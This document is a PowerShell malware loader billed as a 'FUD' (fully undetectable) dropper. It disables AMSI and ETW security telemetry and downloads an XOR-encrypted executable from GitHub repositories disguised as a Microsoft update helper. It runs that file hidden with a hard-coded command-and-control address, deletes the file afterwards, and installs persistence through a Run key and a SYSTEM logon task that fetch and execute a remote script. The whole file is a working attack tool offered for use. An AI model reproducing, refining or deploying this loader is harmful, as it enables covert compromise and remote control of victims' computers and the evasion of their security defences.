# VOID-9 Overlord Max FUD Loader 2026 - Stable + Stealth
$ErrorActionPreference = 'SilentlyContinue'

# AMSI + ETW + ScriptBlock full bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

try {
    # Multi-mirror fallback (GitHub primary + mirrors)
    $urls = @(
        "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe",
        "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"  # add more repos later if you want
    )

    $data = $null
    foreach ($u in $urls) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $data = $wc.DownloadData($u)
            if ($data.Length -gt 1000000) { break }
        } catch {}
    }

    if (-not $data) { exit }

    # XOR decrypt
    for($i=0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0x69 }

    # Random temp name + path
    $tempFile = "$env:TEMP\MicrosoftUpdateHelper_$(Get-Random).exe"

    [IO.File]::WriteAllBytes($tempFile, $data)

    # Run hidden
    Start-Process -FilePath $tempFile -ArgumentList "http://176.65.132.236:5173", "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ" -WindowStyle Hidden -PassThru

    # Auto self-delete after 3 seconds
    Start-Sleep -Seconds 3
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    # Persistence (Run key + Task Scheduler)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" -Force

    $taskName = "MicrosoftUpdateHelper"
    schtasks /create /tn $taskName /tr "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" /sc onlogon /ru SYSTEM /f | Out-Null

    exit
}
catch { exit }
